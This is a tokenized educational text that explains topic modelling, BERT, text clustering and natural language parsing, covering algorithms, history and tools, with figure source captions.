Such a model is simple but it ignores phrase - level co - occurrences .
An alternative is the unigram model in which words are randomly drawn from a categorical distribution .
A mixture of such unigram models is also possible .
For example , each topic has a distribution of words .
We randomly draw words conditioned on the topic .
Essentially , words are being generated by latent variables of the model .
Thus , a topic modelling algorithm such as LDA is a generative model .
Could you explain how documents , words and topics are related ?
The Document - Term matrix is decomposed into two other matrices .
Source : Pascual 2019 .
The basic approach towards topic modelling is to prepare a document - term matrix .
For each document , we count how many times a particular term occurs .
In practice , not all terms are equally important .
For this reason , TF - IDF weighting is used instead of raw counts .
TF - IDF effectively gives more weight to frequent terms in a document that 's rarer in the rest of the corpus .
The next step is to decompose this matrix into document - topic and term - topic matrices .
We do n't in fact identify the names of these topics .
This is something the analyst can do by looking at the main terms of the topic .
In the figure , we can see that T1 is probably about sports because of the terms Lebron , Celtics and Sprain .
Since the number of topics is far fewer than the vocabulary , we can view topic modelling as a dimensionality reduction technique .
To determine exactly how many topics we should look for , the Kullback - Leibler Divergence score is a useful measure .
Could you describe the main algorithms for topic modelling ?
Comparing common topic modelling algorithms .
Source : Lee et al .
2010 , table 2 .
We mention three main algorithms : Latent Semantic Analysis ( LSA ) : Also called LSI , this algorithm constructs a semantic space in which related words and documents are placed near one another .
It uses SVD as the technique .
Probabilistic LSA ( pLSA ) : Also called aspect model , this is a probabilistic generative model .
It does n't use SVD .
It looks at the probability of a topic given a document and the probability of a word given a topic .
These are multinomial distributions that can be trained with an EM algorithm .
Latent Dirichlet Allocation ( LDA ) : This is a Bayesian approach .
A document is modelled on a finite mixture of topics .
Each topic is modelled as an infinite mixture of topic probabilities .
Topic probabilities make up a document 's representation .
The topic mixture is a Dirichlet distribution .
What are some common challenges with topic modelling ?
Topic modelling does n't provide a method to select the optimum number of topics .
LDA has many free parameters that can cause overfitting .
LDA uses Bayesian priors without suitable justification .
Statistical properties of the data ( such as Zipf 's Law ) may also differ from the assumptions .
LSA is a linear model .
It might not fit non - linearities in the dataset .
It assumes Gaussian distribution of terms .
SVD is also computationally expensive .
LSA uses less efficient representations .
Its results are not easily interpretable .
LDA ca n't directly represent co - occurrence information since words are sampled independently .
A model based on Generalized Pólya urns or Bayesian regularization can solve this .
High - frequency non - specific words will result in topics that users may find too general and not useful .
For example , documents on artificial intelligence might have the words ' algorithm ' , ' model ' or ' estimation ' occurring frequently .
Low - frequency specific words are equally problematic .
We could end up with topics that all look nearly the same .
This can be solved by conditioning the prior topic distribution with data .
What techniques have been used to improve the performance of topic modelling ?
Topics can be inferred from the keywords .
Source : Prabhakaran 2018 .
When pre - processing text , it 's common to do lemmatization , remove punctuation and stop words .
In addition , we can remove low frequency terms since they represent weak features .
We could also make use of POS tags and remove terms that are not contextually important .
For example , all prepositions could be removed .
Another technique is to do batch - wise LDA .
Each batch will provide a different set of topics and an intersection of these might give the best topic terms .
Through user interactions , we could add constraints , or merge or separate topics .
For example , for two highly correlated words , we can add the constraint that they should appear on the same topic .
Some approaches to improving upon LDA include integrating topics with syntax ; looking at correlation between topics such as Pachinko Allocation Model ( PAM ) or Correlated Topic Model ( CTM ) ; using metadata such as authors ; accounting for burstiness of words ( word once used in a document is more likely to appear again ) .
Non - parametric models such as Pitman - Yor or negative binomial processes have tried to address Zipf 's Law .
What are some useful resources for research into topic modelling ?
The R topicmodels package is used within a text analysis workflow .
Source : Robinson and Silge 2017 , fig .
6 - 1 .
Developers can use the MALLET Java package for topic modelling .
A wrapper for this in R is available in the mallet package .
Another R package is topicmodels .
The latter package can do LDA ( VEM or Gibbs estimation ) or CTM ( VEM estimation ) .
Python developers can use nltk for text pre - processing and gensim for topic modelling .
Package gensim has functions to create a bag of words from a document , do TF - IDF weighting and apply LDA .
If the intent is to do LSA , then sklearn package has functions for TF - IDF and SVD .
The MALLET package is also available in Python via gensim .
pyLDAvis is a Python library for topic model visualization .
An analyst can use this to look at the terms of a topic and decide the topic name .
For automatic topic labelling , Wikipedia can be a useful data source .
Those who wish to use a cloud service can look at Amazon Comprehend .
It uses LDA on a collection .
It returns terms - topics and documents - topics associations .
A job should include at least 1000 documents .
SVD is used in LSA for topic modelling .
Source : Raju 2019 .
Deerwester et al .
apply Singular Value Decomposition ( SVD ) to the problem of automatic indexing and information retrieval .
They note that users want to retrieve documents not by words but rather by concept .
By applying SVD on a document - term matrix , they bring together terms and documents that are closely related in the " semantic space " .
Their idea of semantics is nothing more than a topic or concept .
They call their method Latent Semantic Indexing ( LSI ) or Latent Semantic Analysis ( LSA ) .
The name LSI reflects its origins in information retrieval .
Papadimitriou et al .
present the first mathematical analysis to rigorously explain why LSI works so well for information retrieval .
Since LSI uses statistical properties of the corpus , they start with a probabilistic model of the corpus .
Graphical representation of pLSA in two equivalent forms : asymmetric and symmetric parameterization .
Source : Hofmann 1999 , fig .
1 .
Hofmann presents a statistical analysis of LSA , perhaps independently of the work of Papadimitriou et al .
He coins the term Probabilistic Latent Semantic Analysis ( pLSA ) .
It 's based on the aspect model , which is a latent variable model .
It associates unobserved class variables ( topics ) with each observation ( words ) .
Unlike LSA , this is a proper generative model .
First presented at the NIPS 2001 conference , Blei et al .
describe in detail a probabilistic generative model that they name Latent Dirichlet Allocation ( LDA ) .
They note that pLSA lacks a probabilistic model at the document level .
LDA overcomes this .
CTM model ( top ) and example correlations ( bottom ) of diagonal covariance , negative correlation and positive correlation .
Source : Blei and Lafferty 2005 , fig .
1 .
Blei and Lafferty present a Correlated Topic Model ( CTM ) to overcome the limitation of LDA .
LDA is unable to capture correlations among topics .
For example , a document about genetics is more likely to be about disease than x - ray astronomy .
CTM captures these correlations via the logistic normal distribution .
One of their results shows that CTM can handle as many as 90 topics whereas LDA peaks at only 30 topics .
ART model and three related models for social network analysis .
Source : McCallum et al .
2007 , fig .
1 .
Researchers at the University of Massachusetts apply topic modelling to social network analysis .
They note that previous analysis looked at only links between network nodes .
Their work also looks at topics on those links .
They call their model Author - Recipient - Topic ( ART ) .
It 's based on LDA .
Newman et al .
study a number of methods to automatically measure topic coherence .
High coherence implies better interpretability .
As an upper bound for comparison , they use inter - annotator agreement ( IIA ) as the gold standard .
They find that Pointwise Mutual information ( PMI ) performs best and comes close to IIA .
PMI is calculated between word pairs in a document on a 10-word sliding window .
PMI measures the statistical independence of two words occurring in close proximity .
Arora et al .
Note the limitations of SVD : only one topic per document or recovering only spans of topic vectors rather than the vectors themselves .
Instead , they propose the use of Non - negative Matrix Factorization ( NMF ) .
They assume that every topic has an anchor word that separates it from other topics .
This aspect of separability using NMF was studied by the machine learning community at least a decade earlier .
Illustrating selection of Topic 17 in Termite tool .
Source : Chuang et al .
2012 , fig .
3 .
Chuang et al .
present Termite , a tool for analyzing the performance of topic modelling .
It 's a term vs topic visualization on a grid , with the size of circles depicting importance .
In a technique called seriation , terms are ordered to show how they cluster for a topic .
The visualization also helps us see if topics use lots of words or only a handful of them .
We can also see what words are shared across topics .
Navigating Wikipedia via topic models .
Source : Chaney and Blei 2012 , fig .
1 .
Chaney and Blei present a method to visualize topic models .
Given a topic ( such as defined by three most prominent words ) , their system displays associated words , the most relevant documents matching this topic and a list of related topics .
This is more useful than showing just a word cloud .
Word clouds typically show only the topics and they make visual search difficult .
Multi - Grain Clustering Topic Model ( MGCTM ) .
Source : Xie and Xing 2013 , fig .
1 .
Xie and Xing propose a model that integrates document clustering and text modelling into a single unified framework .
Performing these two tasks separately fails to exploit the correlations between them .
They note that a flat set of topics is not useful across domains .
For example , topics applicable to computer science will be different from topics for economics .
Their model also includes global topics that cut across domains .
Their model has N documents , J groups , K group - specific topics per group , and R global topics .
Word2vec came out in 2013 .
It 's a word embedding that 's constructed by predicting neighbouring words given a word .
LDA , on the other hand , looks at words at the document level .
Moody proposes lda2vec as an approach to capturing both local and global information .
This combines the power of word2vec and the interpretability of LDA .
Word vectors are dense but document vectors are sparse .
Topic modelling and community detection are mathematically similar .
Source : Gerlach et al .
2018 , fig .
2 .
Gerlach et al .
note that topic modelling and community detection have evolved independently .
Because they are conceptually similar , they can be combined into a single unified model .
Community detection is about identifying groups of nodes with similar connectivity patterns .
When applied to topic modelling , we 're inferring topics by way of inferring communities of words and documents .
The Stochastic Block Model ( SBM ) is popular for community detection .
This is adapted as hierarchical SBM ( hSBM ) for topic modelling .
BERT uses many layers of bidirectional transformers .
Source : Adapted from Devlin et al .
2019 , fig .
3 .
NLP involves a number of distinct tasks , each of which typically needs its own set of training data .
Often , each task has only a few thousand samples of labelled data , which is not adequate to train a good model .
However , there 's plenty of unlabelled data readily available online .
This data can be used to train a baseline model that can be reused across NLP tasks .
Bidirectional Encoder Representations from Transformers ( BERT ) is one such model .
BERT is pre - trained using unlabelled data on language modelling tasks .
For specific NLP tasks , the pretrained model can be fine - tuned for that task .
Pre - trained BERT models , and their variants , have been open source .
This makes it easier for NLP researchers to fine - tune BERT and quickly advance the state of the art for their tasks .
What 's the typical process for using BERT ?
Fine - tuning BERT for various NLP tasks .
Source : Devlin et al .
2019 , fig .
4 .
BERT is an evolution of self - attention and transformer architecture that 's becoming popular for neural network models .
BERT is an encoder - only transformer .
It 's deeply bidirectional , meaning that it uses both left and right contexts in all layers .
BERT involves two stages : unsupervised pre - training followed by supervised task - specific fine - tuning .
Once a BERT model is pre - trained , it can be shared .
This enables downstream tasks to do further training on a much smaller dataset .
Different NLP tasks can thus benefit from a single shared baseline model .
In some sense , this is similar to transfer learning that 's been common in computer vision .
While pre - training takes a few days on many Cloud TPUs , fine - tuning takes only 30 minutes on a single Cloud TPU .
For fine - tuning , one or more output layers are typically added to BERT .
Likewise , input embeddings reflect the task .
For question answering , an input sequence will contain the question and the answer while the model is trained to learn the start and end of answers .
For classification , the ` [ CLS ] ` token at the output is fed into a classification layer .
Could you describe the tasks on which BERT is pre - trained ?
BERT does basic token masking whereas ERNIE uses three types of masking .
Source : Liu 2019 , fig .
2 .
BERT is pre - trained on two tasks : Masked Language Model ( MLM ) : Given a sequence of tokens , some of them are masked .
The objective is then to predict the masked tokens .
Masking allows the model to be trained using both left and right contexts .
Specifically , 15 % of tokens are randomly chosen for masking .
Of these , 80 % are masked , 10 % are replaced with a random word , 10 % are retained .
Next Sentence Prediction ( NSP ) : Given two sentences , the model predicts if the second one logically follows the first one .
This task is used to capture the relationship between sentences , since language modelling does n't do this .
Unlike word embeddings such as word2vec or GloVe , BERT produces contextualized embeddings .
This means that BERT produces multiple embeddings of a word , each representing the context around the word .
For example , the word2vec embedding for the word ' bank ' would not differentiate between the phrases " bank account " and " bank of the river " , but BERT can tell the difference .
What are some possible applications for BERT ?
For sentiment analysis , Target - Dependent BERT uses tokens at target positions rather than [ CLS ] .
Source : Gao et al .
2019 , fig .
2 .
In October 2019 , Google Search started using BERT to better understand the intent behind search queries .
Another application of BERT is to recommend products based on a descriptive user request .
The use of BERT for question answering on SQuAD and NQ datasets is well known .
BERT has also been used for document retrieval .
BERT has been used for aspect - based sentiment analysis .
Xu et al .
use BERT for both sentiment analysis and comprehending product reviews so that questions on those products can be answered automatically .
Among classification tasks , BERT has been used for fake news classification and sentence pair classification .
To aid teachers , BERT has been used to generate questions about grammar or vocabulary based on a news article .
The model frames a question and presents some choices , only one of which is correct .
BERT is still new and many novel applications might happen in the future .
It 's possible to use BERT for quantitative trading .
BERT can be applied to specific domains , but we would need domain - specific pre - trained models .
SciBERT and BioBERT are two examples .
Which are the essential parameters or technical details of the BERT model ?
BERT pre - trained models are available in two sizes : Base : 12 layers , 768 hidden size , 12 self - attention heads , 110 M parameters .
Large : 24 layers , 1024 hidden size , 16 self - attention heads , 340 M parameters .
Each of the above took 4 days to train on 4 Cloud TPUs ( Base ) or 16 Cloud TPUs ( Large ) .
For pre - training , a batch size of 256 sequences was used .
Each sequence contained 512 tokens , implying 128 K tokens per batch .
The corpus for pre - training BERT had 3.3 billion words : 800 M from BooksCorpus and 2500 M from Wikipedia .
This resulted in 40 epochs for 1 M training steps .
Dropout of 0.1 was used on all layers .
GELU activation was used .
For fine - tuning , batch sizes of 16 or 32 are recommended .
Only 2 - 4 epochs are needed for fine - tuning .
The learning rate is also different from what 's used for pre - training .
The learning rate is also task specific .
Dropout used the same as in pre - training .
How do I represent the input to BERT ?
Input embeddings in BERT .
Source : Devlin et al .
2019 , fig .
2 .
BERT input embeddings is a sum of three parts : Token : Tokens are basically words .
BERT uses a fixed vocabulary of about 30 K tokens .
To handle rare words or those not in token vocabulary , they 're broken into sub - words and then mapped into tokens .
The first token of a sequence is ` [ CLS ] ` that 's useful for classification tasks .
During MLM pre - training , some tokens are masked .
Segment / Sentence : An input sequence of tokens can be a single segment or two segments .
A segment is a contiguous span of text , not an actual linguistic sentence .
Since two segments are packed into the same sequence , each segment has its own embedding .
Each segment is terminated by a ` [ SEP ] ` token .
For example , in question answering , the question is the first segment and the answer is the second .
Position : This represents the token 's position within the sequence .
In practice , input embeddings can also contain an input mask .
Since sequence length is fixed , the final sequence may involve padding .
The input mask is used to differentiate between actual inputs and padding .
Beginners may wish to look at a visual explanation of BERT input embeddings .
What are some variants of BERT ?
BERT has spawned many variants .
Source : thunlp 2019 .
BERT has inspired many variants : RoBERTa , XLNet , MT - DNN , SpanBERT , VisualBERT , K - BERT , HUBERT , and more .
Some variants attempt to compress the model : TinyBERT , ALERT , DistilBERT , and more .
We describe a few of the variants that outperform BERT in many tasks : RoBERTa : Showed that the original BERT was undertrained .
RoBERTa is trained longer , on more data , with bigger batches and longer sequences , without NSP , and dynamically changes the masking pattern .
ALBERT : Uses parameter reduction techniques to yield a smaller model .
To utilize inter - sentence coherence , ALBERT uses Sentence - Order Prediction ( SOP ) instead of NSP .
XLNet : Does n't do masking but uses permutation to capture bidirectional context .
It combines the best of denoising autoencoding of BERT and autoregressive language modelling of Transformer - XL .
MT - DNN : Uses BERT with additional multi - task training on NLU tasks .
Cross - task data leads to regularization and more general representations .
Could you share some resources for developers to learn BERT ?
Developers can study the TensorFlow code for BERT .
This follows the main paper by Devlin et al .
( 2019 ) .
This is also the source for downloading BERT pre - trained models .
Google has shared TensorFlow code that fine - tunes BERT for Natural Questions .
McCormick and Ryan show how to fine - tune BERT in PyTorch .
HuggingFace provides ` transformers ` Python package with implementations of BERT ( and alternative models ) in both PyTorch and TensorFlow .
They also provide a script to convert a TensorFlow checkpoint to PyTorch .
IBM has shared a deployable BERT model for question answering .
An online demo of BERT is available from Pragnakalp Techlabs .
Encoder self - attention distribution for the word ' it ' in different contexts .
Source : Uszkoreit 2017 .
Vaswani et al .
propose a transformer model in which they use a seq2seq model without RNN .
The transformer model relies only on self - attention , although they 're not the first to use self - attention .
Self - attention is about attending to different tokens of the sequence .
This would later prove to be the building block on which BERT was created .
Peters et al .
use many layers of bidirectional LSTM trained on a language model objective .
The final embeddings are based on all the hidden layers .
Thus , their embeddings are deeply contextual .
They call it Embeddings from Language Models ( ELMo ) .
They show that higher - level LSTM states capture semantics while lower - level states capture syntax .
Devlin et al .
from Google publish on arXiv a paper titled BERT : Pre - training of Deep Bidirectional Transformers forLanguage Understanding .
Google open sources pre - trained BERT models , along with TensorFlow code that does this pre - training .
These models are for English .
Later in the month , Google will release a multilingual BERT that supports about 100 different languages .
The multilingual model preserves the case .
The model for Chinese people is separate .
It uses character - level tokenization .
NAACL announces the best long paper award to the BERT paper by Devlin et al .
The annual NAACL conference itself is held in June .
Whole Word Masking is introduced in BERT .
This can be enabled with the option ` --do_whole_word_mask = True ` during data generation .
For example , when the word ' philammon ' is split into sub - tokens ' phil ' , ' # # am ' and ' # # mon ' , then either all three are masked or none at all .
The Overall , masking rate is not affected .
As before , each sub - token is predicted independent of the others .
Asynchronous memory copy overlaps with computation .
Source : Mukherjee et al .
2019 , fig .
3 .
Since a BERT model has 12 or 24 layers with multi - head attentions , using it in a real - time application is often a challenge .
To make this practical for applications such as conversational AI , NVIDIA released TensorRT optimizations for BERT .
In particular , the transformer layer has been optimized .
Q , K and V are fused into a single tensor , thus locating them together in memory and improving model throughput .
The latency is 2.2ms on T4 GPUs , well below the 10ms acceptable latency budget .
An example shows how BERT improves query understanding .
Source : Nayak 2019 .
Google Search starts using BERT for 10 % of English queries .
Since BERT looks at the bidirectional context of words , it helps in understanding the intent behind search queries .
Particularly for conversational queries , prepositions such as " for " and " to " matter .
BERT 's bidirectional self - attention mechanism takes this into account .
Because of the model 's complexity , for the first time , Search uses Cloud TPUs .
Text clustering .
Source : Kunwar 2013 .
The amount of text data being generated in recent years has exploded exponentially .
It 's essential for organizations to have a structure in place to mine actionable insights from the text being generated .
From social media analytics to risk management and cybercrime protection , dealing with textual data has never been more important .
Text clustering is the task of grouping a set of unlabelled texts in such a way that texts in the same cluster are more similar to each other than to those in other clusters .
Text clustering algorithms process text and determine if natural clusters ( groups ) exist in the data .
What 's the principle behind text clustering ?
Semantically similar sentences .
Source : Yang and Tar 2018 .
The big idea is that documents can be represented numerically as vectors of features .
The similarity in text can be compared by measuring the distance between these feature vectors .
Objects that are near each other should belong to the same cluster .
Objects that are far from each other should belong to different clusters .
Essentially , text clustering involves three aspects : Selecting a suitable distance measure to identify the proximity of two feature vectors .
A criterion function that tells us that we 've got the best possible clusters and stops further processing .
An algorithm to optimize the criterion function .
A greedy algorithm will start with some initial clustering and refine the clusters iteratively .
What are the use cases of text clustering ?
Applications of text clustering .
Source : Nabi 2018 .
We note a few use cases : Document Retrieval : To improve recall , start by adding other documents from the same cluster .
Taxonomy Generation : Automatically generate hierarchical taxonomies for browsing content .
Fake News Identification : Detect if news is genuine or fake .
Language Translation : Translation of a sentence from one language to another .
Spam Mail Filtering : Detect unsolicited and unwanted email / messages .
Customer Support Issue Analysis : Identify commonly reported support issues .
How is text clustering different from text classification ?
Clustering is unsupervised whereas classification is supervised .
" Source : Valcheva 2018 .
Classification is a supervised learning approach that maps an input to an output based on example input - output pairs .
Clustering is an unsupervised learning approach .
Classification : If the prediction value tends to be category like yes / no or positive / negative , then it falls under classification type problem in machine learning .
The different classes are known in advance .
For example , given a sentence , predict whether it 's a negative or positive review .
Clustering : Clustering is the task of partitioning the dataset into groups called clusters .
The goal is to split up the data in such a way that points within a single cluster are very similar and points in different clusters are different .
It determines grouping among unlabelled data .
What are the types of clustering ?
Hard versus soft clustering .
Source : Withanawasam 2015 .
Broadly , clustering can be divided into two groups : Hard Clustering : This groups items such that each item is assigned to only one cluster .
For example , we want to know if a tweet is expressing a positive or negative sentiment .
k - means a hard clustering algorithm .
Soft Clustering : Sometimes we do n't need a binary answer .
Soft clustering is about grouping items such that an item can belong to multiple clusters .
Fuzzy C Means ( FCM ) is a soft clustering algorithm .
What are the steps involved in text clustering ?
Any text clustering approach involves the following steps : Text pre - processing : Text can be noisy , hiding information between stop words , inflexions and sparse representations .
Pre - processing makes the dataset easier to work with .
Feature Extraction : One of the commonly used techniques to extract features from textual data is calculating the frequency of words / tokens in the document / corpus .
Clustering : We can then cluster different text documents based on the features we have generated .
What are the steps involved in text pre - processing ?
Below are the main components involved in pre - processing .
Tokenization : Tokenization is the process of parsing text data into smaller units ( tokens ) such as words and phrases .
Transformation : It converts the text to lowercase , removes all dictionary / accents in the text , and parses html tags .
Normalization : Text normalization is the process of transforming a text into a canonical ( root ) form .
Stemming and lemmatization techniques are used to derive the root word .
Filtering : Stop words are common words used in a language , such as ' the ' , ' a ' , ' on ' , ' is ' , or ' all ' .
These words do not carry important meaning for text clustering and are usually removed from texts .
What are the levels of text clustering ?
Text clustering can be document level , sentence level or word level .
Document level : It serves to regroup documents about the same topic .
Document clustering has applications in news articles , emails , search engines , etc .
Sentence level : It 's used to cluster sentences derived from different documents .
Tweet analysis is an example .
Word level : Word clusters are groups of words based on a common theme .
The easiest way to build a cluster is by collecting synonyms for a particular word .
For example , WordNet is a lexical database for the English language that groups English words into sets of synonyms called synsets .
How do I define or extract textual features for clustering ?
BOW with word as feature .
Source : Hoonlor 2011 , fig .
2.1 .
In general , words can be used to represent a common class of feature .
Word characteristics are also features .
For example , capitalization matters : US versus us , White House versus White house .
Some speech and grammatical structures also add to textual features .
Semantics can be a textual feature : buy versus purchase .
The mapping of textual data into real - valued vectors is called feature extraction .
One of the simplest techniques to numerically represent text is Bag of Words ( BOW ) .
In BOW , we make a list of unique words in the text corpus called vocabulary .
Then we can represent each sentence or document as a vector , with each word represented as 1 for presence and 0 for absence .
Another representation is to count the number of times each word appears in a document .
The most popular approach is using the Term Frequency - Inverse Document Frequency ( TF - IDF ) technique .
More recently , word embeddings are being used to map words into feature vectors .
A popular model for word embeddings is word2vec .
How can I measure similarity in text clustering ?
Words can be similar lexically or semantically : Lexical similarity : Words are similar lexically if they have a similar character sequence .
Lexical similarity can be measured using string - based algorithms that operate on string sequences and character composition .
Semantic similarity : Words are similar semantically if they have the same meaning , are opposite of each other , used in the same way , used in the same context or one is a type of another .
Semantic similarity can be measured using corpus - based or knowledge - based algorithms .
Some of the metrics for computing similarity between two pieces of text are Jaccard coefficient , cosine similarity and Euclidean distance .
Which are some common text clustering algorithms ?
Some types of text clustering algorithms .
Source : Khosla et al .
2019 , fig .
4 .
Ignoring neural network models , we can identify different types : Hierarchical : In the divisive approach , we start with one cluster and split it into sub - clusters .
Example algorithms include DIANA and MONA .
In the agglomerative approach , each document starts as its own cluster and then we merge similar ones into bigger clusters .
Examples include BIRCH and CURE .
Partitioning : k - means is a popular algorithm but requires the right choice of k. Other examples are ISODATA and PAM .
Density : Instead of using a distance measure , we form clusters based on how many data points fall within a given radius .
DBSCAN is the most well - known algorithm .
Graph : Some algorithms have made use of knowledge graphs to assess document similarity .
This addresses the problem of polysemy ( ambiguity ) and synonymy ( similar meaning ) .
Probabilistic : A cluster of words belong to a topic and the task is to identify these topics .
Words also have the possibility that they belong to a topic .
Topic Modelling is a separate NLP task but it 's similar to soft clustering .
pLSA and LDA are example topic models .
How can I evaluate the efficiency of a text clustering algorithm ?
Internal quality measure : more compact clusters on the left .
Source : Hassani and Seidl 2016 .
Measuring the quality of a clustering algorithm has been shown to be as important as the algorithm itself .
We can evaluate it in two ways : External quality measure : External knowledge is required for measuring the external quality .
For example , we can conduct surveys of users of the application that includes text clustering .
Internal quality measure : The evaluation of the clustering is compared only with the result itself , that is , the structure of found clusters and their relations to one another .
Two main concepts are compactness and separation .
Compactness measures how closely data points are grouped in a cluster .
Separation measures how different the found clusters are from each other .
More formally , compactness is intra - cluster variance whereas separation is inter - cluster distance .
What are the common challenges involved in text clustering ?
Document clustering has been studied for many decades .
It 's far from trivial or a solved problem .
The challenges include the following : Selecting appropriate features of documents that should be used for clustering .
Selecting an appropriate similarity measure between documents .
Selecting an appropriate clustering method utilising the above similarity measure .
Implementing the clustering algorithm in an efficient way that makes it feasible in terms of memory and CPU resources .
Finding ways of assessing the quality of the performed clustering .
Vector space model .
Source : Perone 2013 .
Text mining research in general relies on a vector space model .
Salton first proposes to model text documents as vectors .
Features are considered to be the words in the document collection and feature values come from different term weighting schemes , the most popular of which is the Term Frequency - Inverse Document Frequency ( TF - IDF ) .
Massart et al .
The book , The Interpretation of Analytical Chemical Data by the Use of Cluster Analysis , introduces various clustering methods , including hierarchical and non - hierarchical methods .
They show how clustering can be used to interpret large quantities of analytical data .
They discuss how clustering is related to other pattern recognition techniques .
Cutting et al .
adapt partition - based clustering algorithms to cluster documents .
Two of the techniques are Buckshot and Fractionation .
Buckshot selects a small sample of documents to pre - cluster them using a standard clustering algorithm and assigns the rest of the documents to the clusters formed .
Fractionation finds k centres by initially breaking N documents into N / m buckets of a fixed size m > k. Each cluster is then treated as if it 's an individual document and the whole process is repeated until there are only K clusters .
Huang introduces k - modes , an extension to the well - known k - means algorithm for clustering numerical data .
By defining the mode notion for categorical clusters and introducing an incremental update rule for cluster modes , the algorithm preserves the scaling properties of k - means .
Naturally , it also inherits its disadvantages , such as dependence on the seed clusters and the inability to automatically detect the number of clusters .
Sun et al .
develop a novel hierarchal algorithm for document clustering .
They use cluster overlapping phenomenon to design cluster merging criteria .
The system computes the overlap rate in order to improve time efficiency .
Different interpretations of the structure of a text .
Source : Gatius 2019 , slide 5 .
Natural languages were designed by humans , for humans to communicate .
They 're not in a form that can be easily processed or understood by computers .
Therefore , natural language parsing is really about finding the underlying structure given an input of text .
In some sense , it 's the opposite of templating , where you start with a structure and then fill in the data .
With parsing , you figure out the structure from the data .
Natural languages follow certain rules of grammar .
This helps the parser extract the structure .
Formally , we can define parsing as the process of determining whether a string of tokens can be generated by a grammar .
There are a number of parsing algorithms .
Statistical methods have been popular since the 1980s .
By the late 2010s , neural networks were being increasingly used .
Could you introduce the basics of natural language parsing ?
A typical parsing process flows .
Source : Chen 2018 , slide 9 .
A text is a sequence of words .
This can be simply represented as a " bag of words " .
This is not very useful .
We can obtain a more useful representation by making use of syntactic structure .
Such a structure exists because the sentence is expected to follow the rules of grammar .
By extracting and representing this structure , we transform the original plain input into something more useful for many downstream NLP tasks .
Beyond syntax , parsing is also about obtaining the semantic structure .
In a typical flow , input text goes into a lexical analyzer that produces individual tokens .
These tokens are the input to a parser , which produces the syntactic structure of the output .
When this structure is graphically represented as a tree , it 's called a Parse Tree .
A parse tree can be simplified into an intermediate representation called Abstract Syntax Tree ( AST ) .
Structure can be represented either as a phrase structure tree or in labelled bracketed notation .
What are the common difficulties in natural language parsing ?
Ambiguity produces two different parse trees , shown along with bracketing notation .
Source : Adapted from Bird et al .
2019 , fig .
3 .
Breaking an input into sentences is the first challenge .
Input could be formatted as tables or may contain page breaks .
While punctuation is useful for this task , punctuation in abbreviations ( e.g. or U.S. ) can cause problems .
Given an input , a parser should be able to pick out the main phrases .
This is not a solved problem .
A more difficult problem is to obtain the correct semantic relationships and understand the context of discussion .
Word embeddings such as word2vec operate at word level .
This work needs to be extended to phrases .
Annotated corpora and neural network models are often about newswire content .
Applying them to specific domains such as medicine is problematic .
Unlike parsing computer languages , parsing natural languages is more challenging because there 's often ambiguity in human communication .
A well - known example is " I shot an elephant in my pajamas .
" Was I or was the elephant wearing my pajamas ?
Humans also use sarcasm , colloquial phrases , idioms , and metaphors .
They may also communicate with grammatical or spelling errors .
Could you compare constituency parsing with dependency parsing ?
Phrase structure ( left ) and dependency structure ( right ) .
Source : Choi 2009 , slide 4 .
Constituency parsing and dependency parsing are respectively based on Phrase Structure Grammar ( PSG ) and Dependency Grammar ( DG ) .
Dependency parsing , in particular , is known to be useful in many NLP applications .
PSG breaks a sentence into its constituents or phrases .
These phrases are in turn broken into more phrases .
Thus , the parse tree is recursive .
On the other hand , DG is not recursive , implying that phrasal nodes are not produced .
Rather , it identifies a network of relations .
Two lexical items are asymmetrically related .
One of them is the dependent word , the other is the head or governing word .
Relations are labelled .
Consider the sentence , " She bought a car " .
In constituency parsing , " bought a car " is a verb phrase , which in turn contains the noun phrase " a car " .
Thus , the structure is recursive .
With dependency parsing , a directed arc identifies the relationship along with a label .
Typically , arrows go from head to dependent .
Languages such as Finnish that allow greater freedom of word order will benefit from dependency representation .
This does n't mean that English ca n't benefit from dependency representation .
What is shallow parsing and how is it useful ?
An example of shallow parsing .
Source : Ananiadou et al .
2010 , slide 40 .
Constituency parsing is complex .
Traditionally , such full parsing was not robust in noisy surroundings ( although CoNLL 2007 Shared Task changed that ) .
Some researchers therefore proposed partial parsing where completeness and depth of analysis were sacrificed for efficiency and reliability .
Chunking or shallow parsing is a basic task in partial parsing .
Chunking breaks up a sentence into syntactic constituents called chunks .
Thus , each chunk can be one or more adjacent tokens .
Unlike full parsing , chunks are not further analyzed .
Chunking is thus non - recursive and fast .
Chunks alone can be useful for other NLP tasks such as named entity recognition , text mining or terminology discovery .
Chunks can also be a useful input to a dependency parser .
POS tagging tags the words but does n't bring out the syntactic structure .
Chunking can be seen as being somewhere between POS tagging and full parsing .
Chunking can include POS tags .
Perceptron , SVM and bidirectional MEMM are some algorithms used for chunking .
What are the main approaches to text parsing ?
Parsing is really a research problem .
The search space of possible parse trees is defined by grammar .
An example grammar rule is " VP & rarr ; VP NP " .
Broadly , there are two parsing strategies : Top Down : Goal - driven .
It starts from the root node and expands to the next level of nodes using grammar .
Checks for left - hand side match of grammar rules .
Repeat this until we reach the POS tags on the leaves .
Trees that do n't match the input are removed .
Bottom Up : Data - driven .
It starts from the input sequence of words and their POS tags .
Builds the tree upwards using grammar .
Checks for right - hand side match of grammar rules .
While bottom - up can waste time searching for trees that do n't lead to the root sentence , it 's grounded on the input and therefore never suggests trees that do n't match the input .
These pros and cons are reversed from the top - down .
The Recursive descent parser is top - down .
Shift - reduce parser is bottom - up .
Recursive descent parsers ca n't handle left - recursive production .
The Left - corner parser is a hybrid that solves this problem .
Borrowing from dynamic programming , chart parsing saves and reuses intermediate results .
It also dynamically determines the order in which entries are processed .
What are the some algorithms for text parsing ?
Joint span HPSG parsing model with self - attention layers .
Source : Zhou and Zhao 2019 , fig .
4 .
State - of - the - art models in 2019 will be based on neural networks .
For both constituency parsing and dependency parsing , a combination of self - attention transformer architecture and Head - Driven Phrase Structure Grammar ( HPSG ) gave the best score .
Earlier models used LSTM .
Before the use of neural networks , there were a number of algorithms : Stanford , Charniak , CJ , Bikel , Berkeley ( for constituency ) ; and Covington , Nivre , MSTParser , RelEx ( for dependency ) .
Most dependency parsers are much faster than constituency parsers .
MaltParser implements Nivre and Covington algorithms .
MSTParser implements Eisner and Edmonds algorithms .
Algorithms that adopt dynamic programming include Cocke - Kasami - Younger ( CKY ) , Earley , and chart parsing .
While CKY is bottom - up , Earley is top - down .
How do text parsing algorithms disambiguate ?
A lexicalized parse tree and its rules .
Source : Collins 2003 , fig .
2 .
When there 's ambiguity , we end up with multiple parse trees .
This is where probabilistic grammar becomes useful , where rules have associated probabilities .
The most probably parse tree is selected .
The well - known CKY algorithm has become probabilistic .
Given a treebank such as the Penn Treebank , it 's easy to obtain these probabilities .
